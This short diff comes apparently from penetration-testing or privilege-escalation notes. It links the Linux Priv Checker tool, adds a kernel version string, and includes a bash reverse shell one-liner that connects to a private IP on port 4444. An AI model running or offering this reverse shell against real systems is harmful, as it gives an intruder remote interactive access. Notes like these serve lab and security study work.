@@ -11,6 +11,7 @@ The target system’s environment will influence the tool you will be able to us
 -   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
 
 
+3.13.0-24-generic
 
 bash -i >& /dev/tcp/10.14.29.68/4444 0>&1
 
